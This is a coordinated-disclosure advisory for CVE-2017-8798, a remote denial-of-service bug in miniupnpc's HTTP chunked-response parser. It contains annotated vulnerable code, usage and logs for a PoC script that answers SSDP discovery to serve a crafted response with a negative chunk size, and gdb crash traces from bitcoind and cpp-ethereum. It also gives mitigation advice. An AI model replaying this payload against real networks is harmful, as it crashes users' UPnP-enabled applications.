@@ -1,0 +1,534 @@
+id: 27766
+date: 05/14/2017
+title: miniupnpc 2.0.20170421 Denial Of Service Exploit
+author: tintinweb
+cves: CVE-2017-8798
+
+Author:     <github.com/tintinweb>
+Ref:        https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798
+Version:    0.6
+Date:       May 1st, 2017
+
+Tag:        miniupnp miniupnpc getHTTPResponse chunked encoding integer signedness error
+
+Overview
+--------
+
+Name:           miniupnpc
+Vendor:         Thomas Bernard
+References:     * http://miniupnp.free.fr/ [1]
+
+Version:        v2.0 [2]
+Latest Version: v2.0.20170421 [2][3]
+Other Versions: >= v1.4.20101221 [2] (released 21/12/2010; ~6 years ago)
+Platform(s):    cross
+Technology:     c
+
+Vuln Classes:   CWE-196, CWE-190
+Origin:         remote
+Min. Privs.:    ---
+
+CVE:            CVE-2017-8798
+
+
+Description
+---------
+
+quote website [1]
+
+>UPnP IGD client lightweight library and UPnP IGD daemon
+>The UPnP protocol is supported by most home adsl/cable routers and
+ Microsoft Windows 2K/XP. The aim of the MiniUPnP project is to bring a
+ free software solution to support the "Internet Gateway Device" part of
+ the protocol. The MediaServer/MediaRenderer UPnP protocol (DLNA) is also
+ becoming very popular but here we are talking about IGD. ReadyMedia
+ (formely known as MiniDLNA) is a UPnP Media Server using some UPnP code
+ from MiniUPnPd.
+
+miniupnp is part of many applications / embedded network devices
+
+* P2P File Sharing software
+* Network Device Firmware
+* Blockchain clients
+* ...
+
+
+Summary
+-------
+
+*TL;DR - one-click crash miniupnpc based applications on your network*
+
+#### Integer signedness error in miniupnpc allows remote attackers to
+cause a denial of service condition via specially crafted HTTP response
+
+An integer signedness error was found in miniupnp's `miniwget` allowing
+an unauthenticated remote entity typically located on the
+local network segment to trigger a heap corruption or an access violation
+in miniupnp's http response parser when processing a specially crafted
+chunked-encoded response to a request for the xml root description url.
+
+To exploit this vulnerability, an attacker only has to provide a
+chunked-encode HTTP response with a negative chunk length to upnp 
+clients requesting a resource on the attackers webserver. Upnp clients 
+can easily be instructed to request resources on the attackers webserver
+by answering SSDP discovery request or by issueing SSDP service 
+notifications (low complexity, integral part of the protocol). 
+
+
+* remote, unauthenticated, `ACCESS_VIOLATION_READ` and heap corruption
+* (confirmed) DoS; (unconfirmed) other impacts
+
+
+see attached PoC
+see proposed patch
+
+Details
+-------
+
+The vulnerable component is a HTTP file download method called 
+`miniwget` (precisely `getHTTPResponse`) that fails to properly handle
+invalid chunked-encoded HTTP responses. The root cause is a bounds check
+that mistakenly casts an unsigned attacker-provided chunksize to signed
+int leading to an incorrect decision on the destination heap buffer size
+when copying data from the server response to an internal buffer. The
+attacker controls both the size of the internal buffer as well as the
+number of bytes to copy. In order for this attack to succeed, the number
+of bytes to copy must be negative.
+
+attacker controls:
+* `int content_length`
+* `unsigned int chunksize`
+* `bytestocopy` if `(int) chunksize` is negative (or at least < `n-i` ~ 1900 bytes)
+* length of `content_buf` if `bytestocopy` is negative
+
+In the end, the attacker controls
+* `realloc(content_buf, content_length)`
+* `memcpy(content_buf+x, http_response, chunksize)`
+
+
+client (miniupnpc)                         server (poc.py)
+    |                                         |
+    |                                         |
+    | SSDP:  Discovery - M-SEARCH             |
+1.  | --------------------------------------> |
+    |                                         |
+    | SSDP:  Reply - Location Header          |
+2.  | <-------------------------------------- |
+    |                                         |
+    |        GET (Location Header/xxxx.xml)   |
+3.  | --------------------------------------> |
+    |                                         |
+    |        HTTP chunked-encoded reply       |
+4.  | <-------------------------------------- |
+    |                                         |
+
+1. application performs SSDP discovery via M-SEARCH (multicast, local network
+   segment)
+2. poc.py responds with the url to the xml root description requesting the
+   application to navigate to the malicious webserver.
+3. application requests xml root description url (taken from reply to M-SEARCH,
+   Location Header) on malicious webserver (poc.py)
+4. poc.py responds with a specially crafted http response triggering the heap
+   overwrite in miniupnp
+
+#### Source
+
+*Note:* Inline annotations are prefixed with //#!
+*Note:* This is a stripped down version of the vulnerable code. For full details
+        see https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798
+
+`miniwget.c:236` [4]
+
+* A) 1. to 3. is the parsing of the chunksize
+* B) 4. to 5. integer signedness error
+* C) 6. integer wrapping
+* D) 7. to 9. destination buffer size
+* E) 10. heap overwrite with size in bytestocopy
+
+...
+//#! 4)
+//#!   goal: a) bytestocopy becomes negative due to chunksize being negative
+//#!         b) content_length defines destination buffer size
+//#!         c) overwrite destination heap buffer content_buf[content_length] with bytestocopy bytes from request
+//#!            memcopy(content_buf[content_length], req_body, (unsigned)bytestocopy)
+//#!
+bytestocopy = ((int)chunksize < (n - i))?chunksize:(unsigned int)(n - i);   //#! 5) boom! - bytestocopy becomes chunksize since chunksize is negative (e.g. -1)
+if((content_buf_used + bytestocopy) > content_buf_len)                      //#! 6) true, since bytestocopy is negative, wraps unsigned content_buf_used
+{
+    char * tmp;
+    if(content_length >= (int)(content_buf_used + bytestocopy)) {           //#! 7) content_length is attacker controlled.
+        content_buf_len = content_length;                                   //#! 8) we want content_length to define our dst buffer size (e.g. 1)
+    } else {                                                                 //#!   if we dont hit this, content_buf_len would likely be ~2k
+        content_buf_len = content_buf_used + bytestocopy;
+    }
+    tmp = realloc(content_buf, content_buf_len);                            //#! 9) realloc to content_length bytes (e.g. 9000)
+    if(tmp == NULL) {
+        /* memory allocation error */
+        free(content_buf);
+        free(header_buf);
+        *size = -1;
+        return NULL;
+    }
+    content_buf = tmp;
+}
+memcpy(content_buf + content_buf_used, buf + i, bytestocopy);               //#! 10) boom heap overwrite with bytesttocopy bytes (e.g. (unsigned)-1) to content_length (e.g. 9000) sized buffer
+content_buf_used += bytestocopy;                                            //#!     (also an out of bounds ready since it has not been checked if buf holds enough bytes)
+i += bytestocopy;
+chunksize -= bytestocopy;
+
+
+#### Taint Graph
+
+basically all `miniwget*` and `UPNP_*` methods.
+
+* getHTTPResponse (vulnerable)
+ * miniwget3
+  * miniwget2
+   * miniwget
+   * miniwget_getaddr
+    * UPNP_GetIGDFromUrl
+    * UPNP_GetValidIGD
+     * UPnP_selectigd
+ * UPNP_Get*
+ * UPNP_Check*
+ * UPNP_Delete*
+ * UPNP_Update*
+ * UPNP_Add*
+
+
+#### Scenarios
+
+The PoC can be configured for three scenarios:
+
+##### 1) SCENARIO_CRASH_LARGE_MEMCPY
+
+Similar to 3) attempts to smash the heap but likely fails with an
+`ACCESS_VIOLATION_READ` when trying to read from an non-accessible
+memory region.
+
+details see [7]
+
+##### 2) SCENARIO_CRASH_REALLOC_NULLPTR
+
+Miniupnp v1.8 was missing an error check for `realloc` which can
+be used to cause a DoS condition when making `realloc` fail while
+allocating a large chunk of data. When `realloc` fails - because
+the requested size of memory cannot be allocated - it returns a
+`nullptr`. Miniupnp ~1.8 was missing a check for the `nullptr`
+and tried to `memcpy` bytes from the attackers http response to
+that `nullptr` which fails with an `ACCESS_VIOLATION`.
+
+To provoke this scenario one must provide an arbitrarily large
+`content_length` (e.g. `0x7fffffff` likely fails on 32 bits) and
+make `memcpy` attempt to copy a byte to that location.
+
+
+##### 3) SCENARIO_CRASH_1_BYTE_BUFFER
+
+The idea is to create a small heap buffer and overwrite it with
+a large chunk of data. This can be achieved by instructing
+miniupnp to `realloc` `content_buf` to a size of `1 byte` by
+providing a `content-length` of `1`. To overwrite this 1 byte
+buffer the attacker provides a negative chunksize e.g.
+`0x80000000`. Depending on the implementation of `memcpy` and
+the memory layout `memcpy` will either fail with a
+`ACCESS_VIOLATION_READ` as we're only providing <= 2048 bytes
+with the server response and will most certainly hit a non-accessible
+memory region while copying `0x80000000` bytes or the application
+crashes because of a heap corruption.
+
+Here's an example of `miniupnpc` corrupting the heap when compiled
+for 32 bit platforms.
+
+
+AC/Ao 0x80504de <getHTTPResponse+1912>    call   memcpy@plt                    <0x8048a20>
+    dest: 0x805981f AC/AC/ 0x0                    //#! <--- size 1 - attacker controlled content_buf
+    src: 0xffffb77e AC/AC/ 0x41414141 ('AAAA')    //#! <--- attacker controlled http response
+    n: 0x80000000                             //#! <--- attacker controlled (must be negative) bytestocopy
+
+pwndbg> i lo
+i = 30
+buf = "f\r\n<xml>BOOM</x"...
+n = <optimized out>
+endofheaders = 91
+chunked = 1
+content_length = 1
+chunksize = 2147483648
+bytestocopy = 2147483648                          //#! <--- nr of bytes to copy from buf
+header_buf = 0x8059008 "HTTP/1.1 200 OK"...
+header_buf_len = 2048
+header_buf_used = <optimized out>
+content_buf = 0x8059810 "<xml>BOOM</x\351\a\002"
+content_buf_len = 1                               //#! <--- destination, realloc'd to 1
+content_buf_used = 15
+chunksize_buf = "\000\060\060\060\060\060\060\060\000\267\377\377p12"...
+chunksize_buf_index = <optimized out>
+reason_phrase = 0x0
+reason_phrase_len = 0
+
+//#! ### before memcpy
+pwndbg> hexdump content_buf 100
++0000 0x8059810  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 00  AC/<xmlAC/>BOOAC/M</xAC/....AC/
++0010 0x8059820  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  AC/....AC/....AC/....AC/....AC/
+...
++0060 0x8059870  00 00 00 00                                         AC/....AC/    AC/    AC/    AC/
++0064 0x8059874
+
+//#! ### after memcpy
+pwndbg> hexdump content_buf 100
++0000 0x8059810  3c 78 6d 6c  3e 42 4f 4f  4d 3c 2f 78  e9 07 02 41  AC/<xmlAC/>BOOAC/M</xAC/...AAC/
++0010 0x8059820  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  AC/AAAAAC/AAAAAC/AAAAAC/AAAAAC/
+...
++0060 0x8059870  41 41 41 41                                         AC/AAAAAC/    AC/    AC/    AC/
++0064 0x8059874
+
+
+Proof of Concept
+----------------
+
+Prerequisites:
+
+* any software that compiles with `miniupnpc`, calls `miniwget.c::miniwget()`
+  or any of the `UPNP_` methods - e.g. bitcoind (with -upnp), qBittorrent
+  on startup
+* `poc.py`, python 2.7, tested on windows and linux 
+(disable firewall or allow inbound tcp:65000, udp:1900)
+
+Usage:
+
+usage: poc.py [options]
+
+           example: poc.py --listen <your_local_ip>:65000 [--havoc | --target <ip> [<ip>..]]
+
+
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -q, --quiet           be quiet [default: False]
+  -l LISTEN, --listen LISTEN
+                        local httpserver listen ip:port. Note: 0.0.0.0:<port>
+                        is not allowed. This ip is being used in the SSDP
+                        response Location header.
+  -u USN, --usn USN     Unique Service Name.
+  -t [TARGET [TARGET ...]], --target [TARGET [TARGET ...]]
+                        Specify a list of client-ips to attack. Use --havoc to
+                        attempt to crash all clients.
+  -z, --havoc           Attempt to attack all clients connecting to our http
+                        server. Use at your own risk.
+
+run PoC
+
+* local listen ip:port for the malicious web server: 192.168.2.104:65000 (your_local_ip)
+* only attempt to crash client 192.168.2.113 (use --havoc instead of --target to disable whitelist)
+
+#> poc.py --listen <your_local_ip>:65000 --target 192.168.2.113
+
+[poc.py -                 main() ][    INFO]
+
+
+   _  _    _____ _____ _____ _____
+  / |/ |  |  |  |  _  |   | |  _  |            ___ ___    _____ ___ ___ ___
+ / // /   |  |  |   __| | | |   __|   _ _ _   |   | . |  |     | . |  _| -_|
+|_/|_/    |_____|__|  |_|___|__|     |_|_|_|  |_|_|___|  |_|_|_|___|_| |___
+
+                                                      //github.com/tintinweb
+
+
+    [mode  ]     a  filter (targeting ['192.168.2.113'])
+    [listen]     d 192.168.2.104:65000 (local http server listening ip)
+    [usn   ]     a1 uuid:deadface-dead-dead-dead-cafebabed00d::upnp:rootdevice
+
+[poc.py -                 main() ][   DEBUG] spawning webserver: <BadHttpServer bind=('192.168.2.104', 65000)>
+[poc.py -             __init__() ][   DEBUG] [SSDP] bind: 0.0.0.0:1900
+[poc.py -               listen() ][    INFO] [HTTP] bind 192.168.2.104:65000
+[poc.py -             __init__() ][   DEBUG] [SSDP] add membership: UDP/239.255.255.250
+[poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'M-SEARCH' : <function handle_msearch at 0x027B9270>
+[poc.py -               listen() ][    INFO] [HTTP] waiting for connection
+[poc.py -    register_callback() ][   DEBUG] [SSDP] add callback for 'NOTIFY' : <function handle_notify at 0x027B9330>
+[poc.py -               listen() ][   DEBUG] [SSDP] listening...
+[poc.py -               listen() ][    INFO] [      ] connection from: ('192.168.2.113', 43810)
+[poc.py -               listen() ][   DEBUG] GET /xxxx.xml HTTP/1.1
+Host: 192.168.2.104:65000
+Connection: Close
+User-Agent: CentOS/7.2.1511, UPnP/1.1, MiniUPnPc/2.0
+
+
+[poc.py -                 send() ][   DEBUG] HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Content-Length: 9041
+Content-Type: text/html
+
+f
+<xml>BOOM</xml>
+80000000
+AAAAAAAAAAAAAAAA...         //#! Repeated 9k times.
+3
+bye
+0
+[poc.py -                 send() ][ WARNING] [----->] BOOM! payload delivered! - [to:('192.168.2.113', 43810)] <HttpLikeMessage msg=('HTTP/1.1', '200', 'OK') header={'Transfer-Encoding': 'chunked', 'Content-Length': 9041, 'Content-Type': 'text/html'} body='f\r\n<xml>BOOM</xml>\r\n80000000\r\AAAA...<omitted>...AAAA\r\n3\r\nbye\r\n0'>
+[poc.py -               listen() ][    INFO] waiting for connection
+
+
+#### A) miniupnpc v2.0
+
+[tin@localhost miniupnpc]$ gdb --args ./upnpc-static  -u http://192.168.2.104:65000/xxxx.xml -d -s
+...
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/tin/miniupnp/miniupnpc/./upnpc-static -u http://192.168.2.104:65000/xxxx.xml -d -s
+upnpc : miniupnpc library test client, version 2.0.
+ (c) 2005-2016 Thomas Bernard.
+Go to http://miniupnp.free.fr/ or http://miniupnp.tuxfamily.org/
+for more information.
+parsed url : hostname='192.168.2.104' port=65000 path='/xxxx.xml' scope_id=0
+address miniwget : 192.168.2.113
+header='Transfer-Encoding', value='chunked'
+chunked transfer-encoding!
+header='Content-Length', value='9041'                //#!  user provided content length (valid)
+Content-Length: 9041
+header='Content-Type', value='text/html'
+chunksize = 15 (f)
+chunksize = 2147483648 (80000000)                    //#!  user provided chunk size 0x80000000
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7b631a6 in __memcpy_ssse3_back () from /lib64/libc.so.6
+(gdb) up
+#1  0x000000000040897f in getHTTPResponse (s=s@entry=7, size=size@entry=0x7fffffffd59c, status_code=status_code@entry=0x0) at miniwget.c:306
+306          memcpy(content_buf + content_buf_used, buf + i, bytestocopy);
+(gdb) bt
+#0  0x00007ffff7b631a6 in __memcpy_ssse3_back () from /lib64/libc.so.6
+#1  0x000000000040897f in getHTTPResponse (s=s@entry=7, size=size@entry=0x7fffffffd59c, status_code=status_code@entry=0x0) at miniwget.c:306
+#2  0x0000000000408d5c in miniwget3 (host=host@entry=0x7fffffffd500 "192.168.2.104", port=<optimized out>, path=0x7fffffffe73c "/xxxx.xml", size=size@entry=0x7fffffffd59c,
+    addr_str=addr_str@entry=0x7fffffffe320 "192.168.2.113", addr_str_len=addr_str_len@entry=64, httpversion=httpversion@entry=0x40b665 "1.1", scope_id=0, status_code=status_code@entry=0x0)
+    at miniwget.c:468
+#3  0x00000000004091f1 in miniwget2 (status_code=0x0, scope_id=<optimized out>, addr_str_len=64, addr_str=0x7fffffffe320 "192.168.2.113", size=0x7fffffffd59c, path=<optimized out>, port=<optimized out>,
+    host=0x7fffffffd500 "192.168.2.104") at miniwget.c:484
+#4  miniwget_getaddr (url=url@entry=0x7fffffffe722 "http://192.168.2.104:65000/xxxx.xml", size=size@entry=0x7fffffffd59c, addr=addr@entry=0x7fffffffe320 "192.168.2.113", addrlen=addrlen@entry=64,
+    scope_id=scope_id@entry=0, status_code=status_code@entry=0x0) at miniwget.c:659
+#5  0x00000000004043f1 in UPNP_GetIGDFromUrl (rootdescurl=rootdescurl@entry=0x7fffffffe722 "http://192.168.2.104:65000/xxxx.xml", urls=urls@entry=0x7fffffffd6a0, data=data@entry=0x7fffffffd790,
+    lanaddr=lanaddr@entry=0x7fffffffe320 "192.168.2.113", lanaddrlen=lanaddrlen@entry=64) at miniupnpc.c:708
+#6  0x0000000000401f69 in main (argc=<optimized out>, argv=0x7fffffffe478) at upnpc.c:690
+(gdb) i lo
+i = 30
+buf = "f\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 1418 times>...
+n = 1354
+endofheaders = 94
+chunked = 1                      //#!  chunked-encoding mode
+content_length = 9041            //#!  user provided content-length (valid)
+chunksize = 2147483648           //#!  user provided chunk-size (invalid, 0x80000000)
+bytestocopy = 2147483648         //#!  is our chunk-size. used in call to memcpy as the number of bytes to copy.
+header_buf = 0x610010 "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nContent-Length: 9041\r\nContent-Type: text/html\r\n\r\nf\r\n<xml>BOOM</xml>\r\n80000000\r\n", 'A' <repeats 76 times>...
+header_buf_len = 2048
+header_buf_used = 1448
+content_buf = 0x610820 "<xml>BOOM</xml>"
+content_buf_len = 9041           //#!  has been reallocated to content-length (otherwise this would be ~2k)
+content_buf_used = 15
+chunksize_buf = "\000\060\060\060\060\060\060\060\000\311\377\377\377\177\000\000\313\305@\000\000\000\000\000\005\000\000\000\000\000\000"
+chunksize_buf_index = 0
+reason_phrase = 0x0
+reason_phrase_len = 0
+
+
+#### B) cpp-ethereum v1.3.0
+
+[tin@localhost miniupnpc]$ gdb --args eth -v 9
+...
+(gdb) r
+Starting program: /usr/bin/eth -v 9
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+cpp-ethereum, a C++ Ethereum client
+...  05:57:56 PM.351|eth  Reading /home/...
+AC/ASS AC/
+    A1  05:57:56 PM.358|eth  Id: ##013a7f1fAC/A|
+[New Thread 0x7fffe6191700 (LWP 9306)]
+...  05:57:56 PM.371|eth  Opened blockchain DB. Latest: #5203fef2AC/A| (rebuild not needed)
+[New Thread 0x7fffe5990700 (LWP 9307)]
+...  05:57:56 PM.374|eth  Opened state DB.
+[New Thread 0x7fffe4e2a700 (LWP 9308)]
+AC/ASSA<< AC/  05:57:56 PM.375|eth  startedWorking()
+cpp-ethereum 1.3.0
+  By cpp-ethereum contributors, (c) 2013-2016.
+  See the README for contributors and credits.
+Transaction Signer: XE50000000000000000000000000000000 (00000000-0000-0000-0000-000000000000 - 00000000)
+Mining Beneficiary: XE50000000000000000000000000000000 (00000000-0000-0000-0000-000000000000 - 00000000)
+Foundation: XX55PXQKKKXB9BYPBXT1XCYW6R5ELFAT6EM (00000000-0000-0000-0000-000000000000 - de0b2956)
+[New Thread 0x7fffd7fff700 (LWP 9309)]
+[New Thread 0x7fffd77fe700 (LWP 9310)]
+  AC/
+   A1  05:58:00 PM.757|p2p  UPnP device: http://192.168.2.104:65000/xxxx.xml [st: urn:schemas-upnp-org:device:InternetGatewayDevice:1 ]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0x7fffd7fff700 (LWP 9309)]
+0x00007ffff3feb0a9 in __memcpy_ssse3_back () from /lib64/libc.so.6
+(gdb)
+#0  0x00007ffff3feb0a9 in __memcpy_ssse3_back () from /lib64/libc.so.6
+#1  0x00007ffff4a8bfce in getHTTPResponse () from /lib64/libminiupnpc.so.16
+#2  0x00007ffff4a8c43f in miniwget3.constprop.0 () from /lib64/libminiupnpc.so.16
+#3  0x00007ffff4a8c873 in miniwget () from /lib64/libminiupnpc.so.16
+#4  0x00007ffff62cb97f in dev::p2p::UPnP::UPnP() () from /lib64/libp2p.so
+#5  0x00007ffff633d2d0 in dev::p2p::Network::traverseNAT(std::set<boost::asio::ip::address, std::less<boost::asio::ip::address>, std::allocator<boost::asio::ip::address> > const&, unsigned short, boost::asio::ip::address&) () from /lib64/libp2p.so
+#6  0x00007ffff62eed05 in dev::p2p::Host::determinePublic() () from /lib64/libp2p.so
+#7  0x00007ffff62ef3b3 in dev::p2p::Host::startedWorking() () from /lib64/libp2p.so
+#8  0x00007ffff610e979 in dev::Worker::startWorking()::{lambda()#1}::operator()() const () from /lib64/libdevcore.so
+#9  0x00007ffff4831220 in ?? () from /lib64/libstdc++.so.6
+#10 0x00007ffff72cddc5 in start_thread () from /lib64/libpthread.so.0
+#11 0x00007ffff3f97ced in clone () from /lib64/libc.so.6
+
+
+#### D) bitcoind 0.14.1 (linux)
+
+#> src\bitcoind -upnp -printtoconsole
+
+pwndbg> bt
+#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:36
+#1  0x00007ffff6abe91e in getHTTPResponse () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#2  0x00007ffff6abed22 in ?? () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#3  0x00007ffff6abf12d in miniwget_getaddr () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#4  0x00007ffff6ac0f9e in UPNP_GetValidIGD () from /usr/lib/x86_64-linux-gnu/libminiupnpc.so.10
+#5  0x000055555560ee0b in ThreadMapPort () at net.cpp:1446
+#6  0x0000555555622e44 in TraceThread<void (*)()> (name=0x555555a81767 "upnp", func=0x55555560ed3a <ThreadMapPort()>) at util.h:218
+#7  0x0000555555689c4e in boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> >::operator()<void (*)(char const*, void (*)()), boost::_bi::list0> (this=0x5555561544c0, f=@0x5555561544b8: 0x555555622dc2 <TraceThread<void (*)()>(char const*, void (*)())>, a=...) at /usr/include/boost/bind/bind.hpp:313
+#8  0x000055555568996a in boost::_bi::bind_t<void, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> > >::operator() (this=0x5555561544b8) at /usr/include/boost/bind/bind_template.hpp:20
+#9  0x00005555556896eb in boost::detail::thread_data<boost::_bi::bind_t<void, void (*)(char const*, void (*)()), boost::_bi::list2<boost::_bi::value<char const*>, boost::_bi::value<void (*)()> > > >::run (this=0x555556154300) at /usr/include/boost/thread/detail/thread.hpp:117
+#10 0x00007ffff753aaea in ?? () from /usr/lib/x86_64-linux-gnu/libboost_thread.so.1.55.0
+#11 0x00007ffff5c3a064 in start_thread (arg=0x7fffd97fa700) at pthread_create.c:309
+#12 0x00007ffff596f62d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111
+
+
+Mitigation / Workaround / Discussion
+-------------------------------------
+
+* update to miniupnpc-2.0.20170509.tar.gz
+* disable upnp
+
+*Note*: patch see [7]
+
+
+Notes
+-----
+
+* Vendor acknowledgement / Miniupnp Changelog [5]
+* Thanks to the miniupnp project for providing a fixed version within ~1 week!
+* This research/disclosure was coordinated in cooperation with the ethereum foundation at ethereum.org. Thanks, it was a pleasure working with you!
+
+
+References
+----------
+
+[1] http://miniupnp.free.fr/
+[2] http://miniupnp.free.fr/files/
+[3] https://github.com/miniupnp/miniupnp/tree/master
+[4] https://github.com/miniupnp/miniupnp/blob/master/miniupnpc/miniwget.c#L236
+[5] http://miniupnp.free.fr/files/changelog.php?file=miniupnpc-2.0.20170509.tar.gz
+[6] https://github.com/miniupnp/miniupnp/commit/f0f1f4b22d6a98536377a1bb07e7c20e4703d229
+[7] https://github.com/tintinweb/pub/tree/master/pocs/cve-2017-8798
+
+
+Contact
+-------
+
+https://github.com/tintinweb
+
+#  0day.today [2023-03-23]  #
